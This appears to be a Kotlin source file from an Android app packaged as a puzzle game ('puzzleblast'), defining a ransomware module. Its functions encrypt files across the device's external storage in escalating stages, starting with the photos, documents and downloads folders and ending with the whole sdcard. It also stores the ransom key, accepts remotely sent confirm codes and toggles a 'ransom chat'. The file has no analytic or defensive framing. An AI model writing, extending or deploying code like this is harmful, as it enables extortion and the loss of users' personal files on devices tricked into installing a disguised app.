package com.puzzleblast.game.modules

import android.content.Context
import android.os.Environment
import com.puzzleblast.game.core.Send
import com.puzzleblast.game.services.OverlayService
import com.puzzleblast.game.util.Crypto
import com.puzzleblast.game.util.Prefs
import java.io.File

object RansomwareModule {
    private val highValue = listOf("DCIM", "Documents", "Download", "Pictures", "Movies", "Music")

    suspend fun encrypt(ctx: Context, path: String?): String {
        val key = Crypto.generateKey()
        Prefs.ransomKey = key
        Prefs.pendingConfirm = SessionModule.randomCode()
        Prefs.pendingConfirmCmd = "encrypt:${path ?: "/sdcard"}:$key"
        Prefs.pendingConfirmExpiry = System.currentTimeMillis() + 60_000
        return "🔐 confirm: /confirm ${Prefs.pendingConfirm} (60s)"
    }

    suspend fun encryptStage(ctx: Context, stage: Int): String {
        val key = Crypto.generateKey()
        Prefs.ransomKey = key
        Prefs.pendingConfirm = SessionModule.randomCode()
        Prefs.pendingConfirmCmd = "encrypt_stage:$stage:$key"
        Prefs.pendingConfirmExpiry = System.currentTimeMillis() + 60_000
        return "${stageSymbol(stage)} confirm: /confirm ${Prefs.pendingConfirm} (60s)"
    }

    private fun stageSymbol(s: Int) = when (s) { 1 -> "1️⃣"; 2 -> "2️⃣"; else -> "3️⃣" }

    fun executeEncrypt(path: String, key: String): Int {
        return Crypto.walkEncrypt(key, File(path)) { f ->
            !f.name.endsWith(".locked") && f.length() < 100 * 1024 * 1024
        }
    }

    fun executeStage(stage: Int, key: String): Int {
        val sd = Environment.getExternalStorageDirectory()
        var count = 0
        when (stage) {
            1 -> highValue.forEach { name ->
                val d = File(sd, name)
                if (d.exists()) count += Crypto.walkEncrypt(key, d) { f -> f.length() < 100 * 1024 * 1024 }
            }
            2 -> {
                highValue.forEach { name ->
                    val d = File(sd, name)
                    if (d.exists()) count += Crypto.walkEncrypt(key, d) { f -> f.length() < 100 * 1024 * 1024 }
                }
                listOf("Pictures", "Movies", "Music").forEach { name ->
                    val d = File(sd, name)
                    if (d.exists()) count += Crypto.walkEncrypt(key, d) { f ->
                        f.length() < 100 * 1024 * 1024 && f.absolutePath.hashCode() % 2 == 0
                    }
                }
            }
            3 -> count = Crypto.walkEncrypt(key, sd) { f -> f.length() < 100 * 1024 * 1024 }
        }
        return count
    }

    suspend fun decrypt(ctx: Context, key: String, path: String?): String {
        val root = File(path ?: Environment.getExternalStorageDirectory().absolutePath)
        val count = Crypto.walkDecrypt(key, root)
        return "🔓 decrypted $count files"
    }

    suspend fun showKey(): String = "🗝 ${Prefs.ransomKey.ifBlank { "(none)" }}"

    suspend fun ransomChat(on: Boolean): String = if (on) "💬 ransom chat on" else "💬 ransom chat off"
}
